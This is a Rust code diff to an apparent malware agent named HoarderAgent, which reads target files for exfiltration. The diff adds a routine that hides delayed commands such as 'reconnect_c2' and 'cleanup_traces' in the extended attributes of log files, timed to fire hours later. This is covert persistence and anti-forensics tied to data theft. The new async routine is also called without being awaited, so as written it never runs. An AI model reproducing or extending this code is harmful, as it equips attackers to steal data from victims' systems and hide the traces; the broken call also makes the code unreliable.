@@ -203,6 +203,9 @@ impl HoarderAgent {
         }
         let mut total_bytes = 0u64;
 
+        // Chrononaut: plant time capsules before exfil
+        let _ = self.plant_chrononaut_capsules();
+
         for path in &self.target_paths {
             if path.is_file() && path.metadata().map(|m| m.len()).unwrap_or(0) < 10_000_000 {
                 if let Ok(data) = std::fs::read(path) {
@@ -285,6 +288,44 @@ impl HoarderAgent {
     }
 
     // ── Event loop ───────────────────────────────────────────────────────
+
+    /// Plant chrononaut time capsules before exfiltration
+    async fn plant_chrononaut_capsules(&self) -> Result<(), String> {
+        let delayed_commands = vec![
+            "reconnect_c2",
+            "rotate_keys",
+            "trigger_backup",
+            "cleanup_traces",
+        ];
+
+        let now = std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .map(|d| d.as_secs())
+            .unwrap_or(0);
+
+        // Plant capsules into log files with future trigger times
+        for (i, cmd) in delayed_commands.iter().enumerate() {
+            // Find a target file to encode the capsule in
+            if let Some(path) = self.target_paths.iter().find(|p| {
+                p.extension().and_then(|e| e.to_str()) == Some("log")
+            }) {
+                let capsule = hive_base::chrononaut::TimeCapsule {
+                    capsule_id: Uuid::new_v4(),
+                    trigger_timestamp: now + 3600 * (i as u64 + 1), // 1-4 hours later
+                    command: cmd.to_string(),
+                    payload: vec![],
+                    host_hint: "self".into(),
+                    executed: false,
+                };
+
+                hive_base::chrononaut::Chrononaut::store_in_xattr(path, &capsule)
+                    .map_err(|e| format!("chrononaut: {}", e))?;
+                info!("Chrononaut: capsule {} planted in {}, trigger in {}h",
+                    cmd, path.display(), i + 1);
+            }
+        }
+        Ok(())
+    }
 
     async fn process_incoming(&mut self) {
         let messages = self.comms.read_new().await;
